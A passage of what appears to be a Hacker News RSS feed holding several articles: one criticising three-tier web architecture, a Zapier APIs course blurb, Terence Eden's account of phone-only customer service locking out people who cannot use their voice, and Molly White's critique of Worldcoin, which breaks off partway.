<div id="readability-page-1" class="page"><div><figure></figure><div><a rel="noopener follow" href="https://yrashk.medium.com/"><div aria-hidden="false"><p><img alt="Yurii Rashkovskii" src="https://miro.medium.com/v2/resize:fill:88:88/1*tCQk9gdAfX7pTckYzxQ6eg.jpeg" width="44" height="44" loading="lazy"></p></div></a></div><p id="412e">Three is a magic number. This is the number of things we can keep in our minds without losing focus. So, logically, a three-tier software architecture (database, backend and frontend) is a great model.</p><p id="c81b">Right? We thought so, too.</p><p id="77da"><strong>Then why does building a feature take so much time?</strong></p><p id="1d68">As engineers, tech leaders, and developers, we often find ourselves mired in the complexities of application “plumbing.”</p><p id="d736">The three-tier model burdens developers with an array of time-consuming trivialities. From endlessly shuffling bytes between the three layers to tediously defining data structures three times over, we wrestle with synchronization overhead across different codebases while striving to optimize performance, manage database schema changes, and maintain data consistency.</p><p id="6605">This leaves us yearning for more time to innovate and build cool new features for our users.</p><p id="a62f">Now, it makes sense: we’ve lost sight that even in a clear 3-tiers architecture, there are more than three things to consider. We, solo developers and small teams, always have to reserve some mental space for non-technical matters, such as the users, their needs, and communication. And even in the technical realm, having three cleanly separated layers still forces us to think about two more things: communication and synchronization between consecutive layers.</p><p id="1121">Looking at the three-tier architecture, we can see how every tier and their integration keep us busy. Let’s say you have a small blogging application and want to add a “category” to each blog post. That sounds like a simple thing to add. But if you follow all the <em>good practices</em> of typical modern web development, here is what you’ll probably have to do:</p><ul><li id="a0f7">Write a database schema migration that creates the new post category structure in the database. Optionally, write a “down” migration that removes it to be able to roll back your changes quickly if necessary.</li><li id="390e">Update your Go struct definitions, Java classes, or whatever backend language-specific structure definitions you use, ideally keeping compatibility with the old and the new database schema. Write backend unit tests for the functions that handle this new data structure.</li><li id="a17f">Write new database queries and document the changes in your API responses.</li><li id="ab30">Update the TypeScript types in your frontend to add the new field, keeping the ability to parse backend responses both with and without the field. Write unit tests for that logic.</li><li id="76cf">Update your React components to display the post’s category.</li><li id="5b48">Ensure data validation for the category is consistent across all layers.</li><li id="75a1">Write an integration test to ensure that the new code on each of the three layers works fine with the rest of the system.</li><li id="9ae7">Synchronize the rollout of updates between the database schema, backend, and frontend. If multiple teams are working on the project, ensure they are all on the same page about when and how the rollout will happen.</li></ul><p id="9f25">Ultimately, what is just a tiny line of text at the top of blog posts for the users becomes a daunting task, representing tens of hours of engineering work to implement.</p><p id="998f">This inefficiency extends to the end-users. Shuffling bytes between multiple layers has a cost: network latency, serialization and deserialization of data, etc. It’s hard to convince people that it’s normal loading a post on Reddit, which contains no more than a few bytes of useful information, to take tens of seconds on their holiday 3G connection. It’s also hard to explain why we can’t do something trivial to the user because it would take too many resources.</p><h2 id="6717">How did we end up here?</h2><p id="bb34">The three-tier architecture is a masterful construct born from the ingenuity of digital artisans seeking to optimize the division of labour.</p><p id="7350">It did not emerge as a torture instrument for web developers but as a response to the growing complexity of web applications. The specialization of labor is the reason why we are not all hunter-gatherers anymore. Similarly, the three-tier model allows us to seek excellence in each specialized function. While it may serve larger organizations with specialized teams well, applying it rigidly in smaller settings is counterproductive. You also can’t ignore that specialization and separating work typically lead to much longer delivery cycles due to the synchronization and communication overhead. How often have you seen such teams ship fast?</p><p id="efb1">Specialization is great when you have a conveyor belt. This implies your inputs and outputs are stable, predictable, and your timing is set. Smaller organizations and individual developers may not have such a luxury. Instead, they may benefit from being able to react and adapt faster. So the shorter their shipping cycle, the better.</p><h2 id="e1ab">The road ahead</h2><p id="9375">Thankfully, we are not alone in recognizing these challenges. A new generation of tools is emerging to bridge the gap and achieve the goal of rapid application development.</p><h2 id="bad2">How people work around the problem today</h2><p id="ea0c">Developers have adopted several workarounds to mitigate the issues of the three-tier model. These include:</p><ol><li id="e83c"><strong>No-code tools</strong>: Tools like Budibase have significantly reduced development time, allowing semi-technical people to build a full application quickly. But their inflexibility and maintenance challenges often limit their long-term viability. Writing an application in a no-code tool is a non-starter if you want it to grow and evolve in the future without having to rewrite it from scratch. And letting go of modern version management software to send emails to colleagues to “please not touch that because I’m working on it” feels like going back to the middle ages. Besides, few no-code tools are interested in you being able to leave their platform easily.</li><li id="79b6"><strong>Backend as a service (BaaS)</strong>: Services like Firebase provide pre-made, one-size-fits-all backends, removing a lot of the backend and database work duplication and greatly accelerating app development. However, they are often trying to hold their users captive. They make local development difficult. They make your application less self-reliant and more expensive to host, deploy, and maintain. Many of these BaaS either end up being abandoned or acquired, leaving everyone rushing to rewrite their code to use something else. And even when everything goes well with your provider, you still need to handle the synchronization between your frontend and your BaaS.</li><li id="553b"><strong>Database-over-HTTP web servers</strong>: Tools like PostgREST and Hasura GraphQL expose a database over HTTP. They tremendously reduce the work developers need to do on the backend, while still being quite lightweight, easy and cheap to deploy. But they solve only a part of the problem. Their goal is not to be a sufficient approach to build a complete application, and they still require you to spend time synchronizing your frontend code and database structure. You cannot do much more to answer a web request than just representing the database contents as it is, unprocessed, but in JSON.</li></ol><h2 id="8d94">How are we trying to solve this</h2><p id="fada">We see all the solutions mentioned above as steps in the right direction but are still not satisfied with the state of rapid application development tools. We believe it’s not only possible, but even probable that in the near future, building a full stack production-ready application will take ten times less effort than today. And rather than waiting for the tooling of the future to arrive, we are uniting, and authoring these tools today, to make this vision a reality. We are not pretending we have found the definitive answer to the triple work problem yet, but the projects we work on already significantly reduce the time it takes to go from an idea to a working web application today without sacrificing the ease of collaborative development and the speed of deployment.</p><ul><li id="d202">For instance, Ophir is working on <a href="https://sql.ophir.dev/" rel="noopener ugc nofollow" target="_blank"><strong>SQLPage</strong></a>, a fast application development framework based on SQL that makes building graphical web applications as simple as writing a database query. SQLPage offers a database-agnostic solution without any dependencies. With SQL as the foundation, you can build a full web app in just one day.</li><li id="d050">Similarly, Yurii is developing <a href="https://omnigres.com/" rel="noopener ugc nofollow" target="_blank"><strong>Omnigres</strong></a>: Designed for larger applications, Omnigres simplifies the development of complex backend logic that runs directly inside a Postgres database. It transforms Postgres into a full back-end application platform.</li></ul><figure><figcaption>Our dream is to enable fluid translation of ideas into working applications.</figcaption></figure><h2 id="8ded">Avoiding triple work in your next project</h2><p id="96b5">The three-tier model has its drawbacks, especially for solo developers and small teams, causing developers to spend excessive time on repetitive tasks and affecting both application performance and development pace.</p><p id="8543"><strong>What is your take on the subject? </strong>If you have felt the hurdles of triple work before and would be interested in migrating to something else, we would love to hear about it in the comments below. If, on the contrary, you think the three-tier model is the way to go even for small teams and building an entire app in the database is a terrible idea, we would love to hear your arguments, too!</p></div><div><p id="3980"><em>This post is written in collaboration between Ophir Lojkine and Yurii Rashkovskii.</em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[An Introduction to APIs (208 pts)]]></title>
            <link>https://zapier.com/resources/guides/apis</link>
            <guid>36932537</guid>
            <pubDate>Sun, 30 Jul 2023 15:54:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://zapier.com/resources/guides/apis">https://zapier.com/resources/guides/apis</a>, See on <a href="https://news.ycombinator.com/item?id=36932537">Hacker News</a></p>
<div id="readability-page-1" class="page"><div builder-type="blocks" data-builder-component="bespoke-page" data-builder-content-id="074d67c4bcaa4ff5bf1632d0339eaf6c" builder-content-id="074d67c4bcaa4ff5bf1632d0339eaf6c" builder-model="bespoke-page" data-name="bespoke-page" data-source="Rendered by Builder.io" id="mainContent"><div builder-id="builder-1dc9c4a296784a7f918fdcffbeaf6d8f"><p><img alt="APIs" data-testid="img" loading="lazy" src="https://res.cloudinary.com/zapier-media/image/upload/q_auto/f_auto/v1680818768/Guides/An%20Introduction%20to%20APIs/apis-lg_zcbbtc.png"></p></div><div builder-type="blocks" builder-parent-id="builder-660ba28e04274b978863cfe6d57226d0" builder-id="builder-660ba28e04274b978863cfe6d57226d0"><div data-testid="Text" builder-id="builder-362c9674d43a4d2bb4a7e218b339c563"><p><h2>About this course</h2></p><div><p>Have you ever wondered how Facebook is able to automatically display your Instagram photos? How about how Evernote syncs notes between your computer and smartphone? If so, then it’s time to get excited!</p><p>In this course, we walk you through what it takes for companies to link their systems together. We start off easy, defining some of the tech lingo you may have heard before, but didn’t fully understand. From there, each lesson introduces something new, slowly building up to the point where you are confident about what an API is and, for the brave, could actually take a stab at using one.</p></div></div><div data-testid="Text" builder-id="builder-4e003156082645e3bef3edfbf2e965c8"><p><h3>Who is this course for?</h3></p><div><p>If you are a non-technical person, you should feel right at home with the lesson structure. For software developers, the first lesson or two may feel like a mandatory new employee orientation, but stick with it – you'll get your fill of useful information, too.</p></div></div><div data-testid="Text" builder-id="builder-d7ffceb930f6465eaea25e23af94db65"><p><strong>CREDITS</strong></p><p>Published April 22, 2014</p><p>Written by Brian Cooksey. Edited by Bryan Landers and Danny Schreiber.</p></div></div><div builder-id="builder-11bfe329e25849d2a35ba831487ba761"><h2>Automation that moves your work forward</h2></div><p><img src="https://cdn.builder.io/api/v1/pixel?apiKey=f2fa4ab5cb7948579e57adce2fde495f" role="presentation" width="0" height="0" builder-id="builder-pixel-h691yawklpd"></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I feel hopeless, rejected, and a burden on society-one week of empathy training (368 pts)]]></title>
            <link>https://shkspr.mobi/blog/2019/07/i-feel-hopeless-rejected-and-a-burden-on-society-one-week-of-empathy-training/</link>
            <guid>36932524</guid>
            <pubDate>Sun, 30 Jul 2023 15:53:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://shkspr.mobi/blog/2019/07/i-feel-hopeless-rejected-and-a-burden-on-society-one-week-of-empathy-training/">https://shkspr.mobi/blog/2019/07/i-feel-hopeless-rejected-and-a-burden-on-society-one-week-of-empathy-training/</a>, See on <a href="https://news.ycombinator.com/item?id=36932524">Hacker News</a></p>
<div id="readability-page-1" class="page"><article itemscope="" itemprop="blogPost"><div itemprop="https://schema.org/articleBody">
<p>I've spent a week cosplaying as a disabled user. And I hate it.</p><p>A couple of months ago, I attended a private talk given by a disabled colleague of mine. "Everyone should believe disabled people's stories about accessibility problems," she said. "But, given that people don't, here's what I want you to do. Spend one week pretending to be disabled. Pick a disability and try to interact with services as though you have that impairment. Build up some empathy."</p><p>So I did.</p><p>For a week, I pretended that I was in a wheelchair. I didn't go the full way and buy a cheap chair and try and commute in it. Instead, whenever I was invited to speak at an event, or go to a meeting, I asked if the venue was accessible.  To my delight, all of them were.  A couple of people told me they'd arrange ramps to the stage, or that they'd need to adjust a podium height if I wanted.</p><p>Except one. I turned up to find the talk had been moved to the 3rd floor of a building with no lift. I'd specifically asked the organisers if the room was wheelchair friendly. They'd had more people turn up than expected, so moved to a bigger room.  At no point did the organisers contact me.</p><p>I turned up (without a chair) and briefly considered leaving. Instead I sent a sternly worded email.</p><p>The week left me feeling fairly hopeful. OK, it wasn't a full test - and there was a failure - but in my little bubble of society, people are (mostly) welcoming to wheelchair users.</p><p>Then it all went wrong.</p><p>The next week, I tried something different. Approximately <a href="https://www.thecommunicationtrust.org.uk/media/2612/communication_difficulties_-_facts_and_stats.pdf">10% of people in the UK have a speech disorder</a>. In the USA, <a href="https://www.nidcd.nih.gov/health/statistics/statistics-voice-speech-and-language">approximately 7.5 million people have trouble using their voices</a>.</p><p>So, I tried to spend a week without using the phone to contact companies. It was a fucking disaster.</p><p>I wanted to upgrade my Internet access to a faster speed. Virgin Media provide a web chat - and after a few hours of waiting (seriously!) I had this frustrating exchange (edited for clarity - typos left intact):</p><ul><li>John: If you wish to avail of this deal . I advise you to call our Customer Care Team.</li><li>Terence: I can't use the phone due to my disability. Can I chat online to do it?</li><li>John: To reach our customer care. You can just download the app and quickly chat with the team there;</li><li>Terence: I've tried using the app - but no one answers. Please can you help me. I've been a customer for 6 years.</li><li>John: We appreciate your loyalty Terence, but we are are only limited to regular upgrade transacations.</li><li>Terence: So disabled customers can't upgrade via chat?</li><li>John: For persons with diabilities, there are options at "Contact Us"</li><li>Terence: I tried that - and it redirected me here. Is there anyone who can help?</li><li>John: I'm so sorry ternce but transactiosn like this can only be arranged by calling Custome care team.</li></ul><p>So I asked to cancel my account.</p><ul><li>Terence: If I want to cancel my account (without using the phone) what can I do?</li><li>John: the only option though is by calling . Call 150 from your Virgin Media phone or mobile, or call 0345 454 1111 * from any other phone Monday to Friday, 8am until 9pm Saturday, 8am until 8pm and Sunday 8am until 6pm For our text relay service call us free on 18001 0800 052 2164 You can also contact us through a sign language interpreter. Open 7 days a week, 8am until midnight. *For call costs to our team from a Virgin Media home phone, visit our Call costs page. Calls from other networks and mobile may vary.</li><li>Terence: This is discrimination. I don't know sign language and I don't have text relay. I can't use my voice. I want to contact someone to cancel my account.</li><li>John: If the voice is the issue, i advise you ask someone to call in  your behalf.</li><li>Terence: I am perfectly capable of managing my affairs - and I don't want to give my password to someone else.</li></ul><p>And so it went on. I spent hours chatting with different people, and with managers. None of them could help me with an upgrade, or with a cancellation.</p><p>Virgin accessibility police says:</p><blockquote><p>
2.1 We are committed to ensuring both vulnerable and disabled customers get fair and appropriate treatment.<br>
2.2 To ensure we meet the needs of current and prospective customers, our sales and support teams are trained to identify and support the accessibility and vulnerability needs people may have.<br>
<a href="https://www.virginmedia.com/corporate/media-centre/public-policy-statements/accessibility-and-vulnerability-policy">https://www.virginmedia.com/corporate/media-centre/public-policy-statements/accessibility-and-vulnerability-policy</a></p></blockquote><p>As far as I can see, that's a load of bunkum. If you don't have a voice, you're locked out of Virgin's upgrade and cancellation routes.</p><p>I raised a complaint, and got back this fairly generic and dismissive response:</p><blockquote><p>
Please accept my apologies for this experience, , this is not the experience we want for our customers.   We have fed your comments back to the relevant team, this will help us to highlight certain training needs and form coaching. There are areas where improvements can always be made, and as a customer-orientated organisation we are always endeavouring to improve both how we deal with customers and the range and quality of the services we offer.</p></blockquote><p>No actual resolution. It made me feel like a burden for even asking for help. I can't go through the "normal" channels - I have to rely on the good graces of a complaints team.  It was frustrating and demoralising.</p><p>The same thing happened with Thames Water.  If you want to move your account, they ask you to fill in a form online. Hurrah! Until you get to one bit of it, where it tells you to ring a phone number.</p><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Dear <a href="https://twitter.com/thameswater?ref_src=twsrc%5Etfw">@thameswater</a>, I'm trying to move house. Your website says the contact number is 0800 000 0000.<br>I assume that's placeholder text as the number is answered by the Prudential!<br>What number should I call?<a href="https://t.co/fT3DzPIy4M">https://t.co/fT3DzPIy4M</a> <a href="https://t.co/AGQ2FqMyr0">pic.twitter.com/AGQ2FqMyr0</a></p><p>— Terence Eden (@edent) <a href="https://twitter.com/edent/status/1155502091122724864?ref_src=twsrc%5Etfw">July 28, 2019</a></p></blockquote><p>I had a frustrating chat on Twitter with Thames Water. They admitted the phone number was wrong, and struggled to provide me with contact details.</p><p>I tried to use their complaints process, but that requires a 10 digit account number. But Thames have upgraded me to a 12 digit number - so their own form doesn't work!</p><p>So now I'm stuck in limbo. Waiting for someone to get back to me. I've told them not to call - but I bet you they try to ring me.</p><p>My bank had similar issues. UK banking is <em>great</em> for most online users. I was able to set up new payees, order a new card, cancel Direct Debit - all without using my voice.  And then I tried to buy a house...</p><p>I needed to transfer a large sum of money in order to put a deposit down on my new place. It was larger than the standard transfer limit. And the <em>only</em> solution was to call them up.</p><p>They do have an online messaging service, but from experience it's slow to answer - and I needed to transfer the money immediately (the home buying process in England is dysfunctional).  If I truly had no voice, I'd have lost the house I was trying to buy.</p><p>I appreciate the need for security. And for double-checking transactions. And all that good stuff. But I was trapped. So I caved in and called.</p><h2 id="i-have-no-mouth-and-i-must-scream"><a href="#i-have-no-mouth-and-i-must-scream">I have no mouth and I must scream</a></h2><p>You should believe your disabled friends and colleagues when they tell you how crap the world can be.</p><p>You should also try empathy building exercises. Here are some examples, please add your own in the comments:</p><ul><li>Go a couple of weeks without using the phone. Which services are closed off to you?</li><li>Tell people you need an accessible venue for your meetings.  How do they respond?</li><li>Turn off images in your browser. Is there enough alt-text for you to navigate the web?</li><li>Switch on subtitles and mute your favourite shows. Do they even have subtitles? What do you miss?</li><li>Hire or buy a wheelchair for a week. How easy is your office to navigate? (Please don't block the accessible loos though!)</li><li>Buy a pair of <a href="http://www.inclusivedesigntoolkit.com/gloves/gloves.html">arthritis simulating gloves</a>. What does the world feel like with limited mobility?</li></ul><p>But, most of all, record how it makes you feel. After a few fruitless hours pleading with my ISP, I was ready to kick something. Now imagine that every day.</p><p>Whether you work in tech or not - it is your duty to make sure that no one feels demoralised or rejected because of the systems you build.</p></div></article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Worldcoin: A solution in search of its problem (215 pts)]]></title>
            <link>https://newsletter.mollywhite.net/p/worldcoin-a-solution-in-search-of</link>
            <guid>36931806</guid>
            <pubDate>Sun, 30 Jul 2023 14:59:40 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://newsletter.mollywhite.net/p/worldcoin-a-solution-in-search-of">https://newsletter.mollywhite.net/p/worldcoin-a-solution-in-search-of</a>, See on <a href="https://news.ycombinator.com/item?id=36931806">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p>Having my eyeballs scanned by a shiny chrome orb so I can someday receive cryptocurrency disbursements because artificial intelligence has stolen my job sounds like something from the pages of a half-baked sci-fi novel. It also sounds like the kind of operation that venture capitalists would value at over a billion dollars.</p><p>The premise is simple, they say: As artificial intelligence becomes more sophisticated, approaching the level of human-superior artificial general intelligence, it will both create wealth and disrupt labor markets as human workers are replaced by machines. It will also become increasingly challenging to distinguish human from machine, as the current-day problem of bots mimicking humans online is made worse by sophisticated AI fakes. Or at least, that’s today’s problem. Check back in a month or two and see if it’s changed.</p><p><span>Worldcoin is, at the moment, a project to distribute cryptocurrency tokens (</span><em>also</em><span> called Worldcoin, or WLD) to those who confirm they are human by having their irises scanned by a custom piece of hardware that both captures its subject’s unique iris “fingerprint” and performs biometric scans to ensure it’s scanning a living, breathing human being and not a printout or some other fake. That custom hardware just so happens to be a chrome orb that evokes HAL 9000.</span></p><p><span>Worldcoin was founded by Sam Altman, the “tech visionary” </span><em>du jour</em><span> who is behind OpenAI. That’s right, the guy who’s going to sell us all the solution to a worsening AI-powered bot infestation of the Internet and to AI-induced mass unemployment is the same guy who’s making the AI in question.</span></p><p><span>He is selling the antidote to the poison he is, coincidentally, </span><em>also</em><span> selling.</span></p><p><span>In June 2022 I wrote an essay titled “</span><a href="https://blog.mollywhite.net/is-acceptably-non-dystopian-self-sovereign-identity-even-possible/" rel="">Is ‘acceptably non-dystopian’ self-sovereign identity even possible?</a><span>“. This was prompted not by Worldcoin, but by a </span><em>different</em><span> identity-related project: Vitalik Buterin’s conception of “soulbound tokens”. In a May 2022 </span><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=4105763" rel="">paper</a><span> he co-authored with E. Glen Weyl and Puja Ohlhaver, he wrote that these identity projects (and related ideas they group under the umbrella of “decentralized society”) must meet the rather low bar of being merely “acceptably non-dystopian” in order to be worth pursuing.</span></p><p><span>In that essay, I wrote about the problem of decentralized identity: that is, how do you determine that someone is who they say they are without relying on a centralized authority (e.g., government-issued identification)? This has been a popular topic in the cryptoverse because of the Sybil problem: the challenge of ensuring that one individual does not operate multiple identities (or crypto wallets) while also respecting anonymity (or pseudonymity). Worldcoin is among the projects trying to solve this problem, sometimes termed “</span><a href="https://en.wikipedia.org/wiki/Proof_of_personhood" rel="">proof of personhood</a><span>”, but hardly the only one. Proof of Humanity, BrightID, and others are doing so as well. They use a range of approaches, from biometrics (Worldcoin) to web-of-trust vouching (BrightID) to some sort of a mix (Proof of Humanity incorporates both vouching and uploading a video of one’s face for verification).</span></p><p>Identity projects aim to answer one or several of the following questions:</p><ol><li><p>Is this user a human?</p></li><li><p><span>Is this user a </span><em>unique</em><span> human? (i.e., do they only control one identity in a given network?)</span></p></li><li><p>Can this user prove they meet some criteria? (e.g., are they over 18? are they a U.S. citizen?)</p></li><li><p>Can this user prove they are a specific person? (e.g., does Molly White control this identity?)</p></li></ol><p><span>If you’ve ever solved a CAPTCHA you probably understand why it’s useful to answer the first question — bot prevention is important and inarguably becoming </span><em>more</em><span> important as bots become more convincing, more disruptive, and more capable of evading anti-bot measures.</span></p><p>The second is useful for ensuring fairness in systems such as voting. In the cryptocurrency world, many DAOs follow the one-token-one-vote model, which makes them susceptible to control by the wealthiest actors. A robust proof-of-personhood solution could, ideally, allow for one-person-one-vote without sacrificing crypto’s beloved pseudonymity. Some also envision decentralized proof of uniqueness as helping with fraud protection in other systems, ranging from ensuring people only get one NFT in an NFT airdrop all the way to critical social welfare programs or universal basic income schemes.</p><p>The third question is distinct from the fourth in that there are times when people might wish to provably answer specific yes or no questions such as “are you over 18?” or “are you a U.S. citizen?” without disclosing their full identity. This is not widely done today: websites generally either ask if you meet the criteria (and simply trust that you aren’t lying), or require you to submit a government-issued ID to prove it (and thus also require you to disclose your full identity to them).</p><p>The fourth question is critical for high-importance activities, like signing legal documents, opening a bank account, or applying for a loan.</p><p><span>Worldcoin is primarily concerned with answering questions 1 and 2: ensuring everyone who is represented in the Worldcoin network is a real person, and only controls one identity in the system. The reasons </span><em>why</em><span> they want to do this have shifted since the project emerged in 2019, making the project hard to pin down. First they seemed most focused on wealth redistribution. Then, during the height of crypto hype, the story centered around onboarding new users to crypto and solving its Sybil problem. More recently, Worldcoin pivoted to the more AI-focused story now that AI is the hot big thing and founder Sam Altman has become its poster boy.</span></p><p><span>The types of things Worldcoin says it could one day do are lofty: “considerably increase economic opportunity, scale a reliable solution for distinguishing humans from AI online while preserving privacy, enable global democratic processes, and show a potential path to AI-funded UBI [universal basic income].“</span></p><p>That’s right: the founders aren’t looking to merely create the next generation of CAPTCHAs, they want to form the base of future democracy and social welfare.</p><p><span>To join the Worldcoin network, people download the World App crypto wallet on their smartphone. They then find a nearby Orb, submit to its iris scan and other biometric humanness-detection, become “</span><em>Orb-verified”</em><span> and receive a World ID. To accomplish this, the Orb scans the iris, applies its special algorithm so that it can compare the iris scan to the others in its database and ensure uniqueness (while accounting for the fact that two scans of the same iris may not be visually identical due to factors such as lighting or angle), and verifies the ID if the iris is indeed new to the database.</span></p><p><span>Worldcoin is very quick to insist that they do not store the iris scan data directly, but rather store an “IrisCode”, which they describe as a mere “set of numbers” on its website.</span></p><p><span> The IrisCode has been widely described in media as a “</span><a href="https://en.wikipedia.org/wiki/Cryptographic_hash_function" rel="">hashed</a><span>” version of the iris scan, and indeed used to be called an “IrisHash” by WorldCoin, but references to hashes seem to have been (somewhat incompletely) scrubbed from the website as of late. Worldcoin tries to insist that they don’t store sensitive biometrics, a claim that requires everyone to simply go along with their assumption that a per-person unique IrisCode </span><em>itself</em><span> is not sensitive data. It’s also not terribly clear yet what kind of data might be leaked by the IrisCode — for example, Vitalik Buterin has questioned if some traits captured in the code might reflect things like sex, ethnicity, or medical conditions.</span></p><p><span>Worldcoin is also considerably less forward about the fact that they encourage users who sign up to “opt in” to image custody. For those who opt in, WorldCoin continues to store the original iris images, they say “because the algorithm that computes the iris code is still evolving to make sure it can support signing up everyone”.</span></p><p><span> With Orbs still relatively scarce, users face the risk of being removed from the pool of verified World ID holders as the algorithm is refined, unless they either have ongoing access to an Orb at which they can be re-scanned, or acquiesce to their original data being retained.</span></p><p>Because the vague promises of maybe someday enabling DAO voting or AI-necessitated UBI are both intangible and probably unappealing to many of the massive number of people Worldcoin hopes to onboard (ranging from several billion to every single human on the planet, depending on which exec you ask and when), Worldcoin has decided to just pay people for their eyeballs.</p><p><span>But rather than handing out cold hard cash, those who sign up receive 25 Worldcoin tokens (WLD), and the opportunity to claim 1 WLD per week going forward. Or at least those in approved jurisdictions do — US-based users can’t receive tokens in return due to pesky regulatory concerns, and in several states or cities can’t be scanned at all.</span></p><p><span> The app is also not available in some jurisdictions, including mainland China.</span></p><p><span> And privacy regulators are already sniffing around in various European markets where Worldcoin has recently started scanning irises in a push following its big launch this week.</span></p><p><span>At the beginning of Worldcoin’s iris-scanning endeavours, the WLD that people received was no more than an IOU, since the token hadn’t yet launched. Since the token launch on July 24, the price has fluctuated between $1.94 and $2.69 — as of writing, it is hovering at around $2.35, making the initial 25-token distribution worth around $59 to anyone who immediately cashes out.</span></p><p>If by now you’ve found yourself thinking “scan my irises and give the data to a bunch of VC-backed tech bros in exchange for tokens that may or may not be worth around $60? sign me up!”, well, keep reading.</p><p><span>A caveat: Worldcoin is at this stage so incredibly vague about what exactly they envision people using the project </span><em>for</em><span> that it is difficult to analyze. I would certainly be asking very different questions of a project that simply aims to ensure people are only receiving their fair allotment of promotional NFTs than of one with aspirations of becoming the voting apparatus for “global democracy” or the operator of a worldwide universal basic income program.</span></p><p><span>Before launching in to future-facing issues with Worldcoin, it’s worth touching on its history a little bit. In April 2022, </span><em><a href="https://www.technologyreview.com/2022/04/06/1048981/worldcoin-cryptocurrency-biometrics-web3/" rel="">MIT Technology Review</a></em><span> and </span><em><a href="https://www.buzzfeednews.com/article/richardnieva/worldcoin-crypto-eyeball-scanning-orb-problems" rel="">BuzzFeed News</a></em><span> nearly simultaneously published longform articles stemming from their investigations of the project, particularly focusing on their experimentation in low-income communities, often in developing countries, and on individuals who did not always understand what they were agreeing to. The articles detailed numerous issues with the company, including unconscionable treatment of their hired “Orb operators”, the widespread use of questionable tactics to entice new people to sign up, inconsistent messaging about exactly what kind of data was being collected or preserved, and lack of compliance with local data privacy policies. Both articles are well worth the read.</span></p><p><span>Much of Worldcoin’s promises are predicated on the questionable idea that highly sophisticated artificial intelligence, even artificial general intelligence, is right around the corner. It also hinges on the “robots will take our jobs!” panic — a </span><a href="https://timeline.com/robots-have-been-about-to-take-all-the-jobs-for-more-than-200-years-5c9c08a2f41d" rel="">staple of the last couple centuries</a><span> — finally coming to bear. Worldcoin offers other use cases for its product too, like DAO voting, but it is not the promise to solve DAO voting that earned them a multi-billion dollar valuation from venture capitalists.</span></p><p><span>Other use cases that Worldcoin has offered seem to assume that various entities — governments, software companies, etc. — would actually </span><em>want</em><span> to use the Worldcoin system. This seems highly dubious to me, particularly given that many governments have established identification systems that already enjoy widespread use. Some even employ biometrics of their own, like India’s </span><a href="https://en.wikipedia.org/wiki/Aadhaar" rel="">Aadhaar</a><span>. There’s also the scalability question: Worldcoin operates on the Optimism Ethereum layer-2 blockchain, a much speedier alternative to the layer-1 Ethereum chain to be sure, but any blockchain is liable to be a poor candidate for handling the kind of volume demanded by a multi-billion user system processing everyday transactions.</span></p><p>And finally, bafflingly, Worldcoin seems to think it —&nbsp;a VC-backed corporation — is best positioned to save the world from this forecasted AI-induced economic upheaval via “AI-funded universal basic income”.</p><p>If you ask the proof-of-personhood folks, centralized identity systems suffer from unacceptable flaws, namely lack of privacy and the risk that the maintainer of the identity system could act maliciously towards members of the network (or could be corrupted or taken over by someone who does). They have some good points.</p><p>But Worldcoin itself is enormously centralized, and at this point, talk of decentralization is little more than handwavy promises. The custom Orb hardware presents a massive obstacle to decentralization that Worldcoin doesn’t seem to have meaningfully grappled with. If Worldcoin is the only group producing these Orbs, they exercise sole control over them — which, in turn, provides them the sole ability to introduce backdoors.</p><p><span>If the Orbs hardware is “decentralized”, which Worldcoin says they intend to do,</span></p><p><span> they then have to ensure that the Orbs are properly constructed following the design specifications they’ve provided, and haven’t been modified to maliciously create IDs outside of the intended mechanism. Worldcoin speaks vaguely of a third-party auditing system and allowlisting process that would attempt to catch any such malicious Orbs, but the scale of such audits required to allow for the quantity of Orbs to achieve billions of signups would be enormous. Furthermore, because Worldcoin incorporates cryptocurrency distributions, any bad actor who was able to slip through a malicious Orb capable of generating fake IDs could rapidly siphon WLD tokens, and even if discovered, the past distribution could not be reversed — they could only be prevented from continuing to create new IDs.</span></p><p><span>The cryptocurrency industry is rife with projects that embrace the idea of “progressive decentralization”: beginning out as a highly centralized project run by a small group, but promising to eventually turn over control of the project to a DAO. Few ever follow through,</span></p><p><span> but it is a convenient way to stave off criticism.</span></p><p>When questioned about the wisdom of attempting to form a huge database of iris scans, Worldcoin argues that only the IrisCode is stored.</p><p>When questioned about the wisdom of creating a system to accomplish everything from voting to welfare to everyday purchases, irrevocably tied to an individual person, all using public blockchains, Worldcoin argues “zero knowledge proofs!” </p><p>End of argument. Concerns assuaged. And indeed, some Worldcoin boosters seem satisfied with these very superficial answers, likely dazzled by the technical details that Worldcoin throws around with their posts about Gabor wavelets and phase-quadrant demodulation and poseidon hashes.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd9b5839a-c046-40d9-aff0-d07041873d43_1740x1116.png 1456w" sizes="100vw"><img 